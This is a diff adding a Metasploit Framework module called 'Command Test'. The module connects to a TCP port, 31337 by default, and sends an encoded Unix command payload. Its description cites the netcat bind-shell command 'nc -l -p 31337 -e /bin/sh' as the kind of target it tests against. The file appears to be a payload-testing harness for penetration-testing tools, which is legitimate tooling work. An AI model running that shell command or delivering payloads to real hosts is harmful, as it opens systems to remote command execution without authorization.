@@ -1,0 +1,60 @@
+##
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = ManualRanking
+
+	include Msf::Exploit::Remote::Tcp
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'         => 'Command Test',
+			'Description'  => %q{
+				This module tests cmd payloads by targeting (for example) a server
+				like: nc -l -p 31337 -e /bin/sh
+			},
+			'Author'	=> 'egypt',
+			'Version' => '$Revision$',
+			'References' => [ ],
+			'DefaultOptions' => { },
+			'Payload' =>
+				{
+				},
+			'Platform' => 'unix',
+			'Arch'     => ARCH_CMD,
+			'Targets' =>
+				[
+					[ 'Automatic Targeting', { } ],
+				],
+			'DefaultTarget' => 0
+		))
+
+		register_options(
+			[
+				Opt::RPORT(31337),
+			], self.class)
+	end
+
+	def autofilter
+		false
+	end
+
+	def exploit
+		connect
+
+		sock.put(payload.encoded + "\n")
+
+		handler
+	end
+
+end
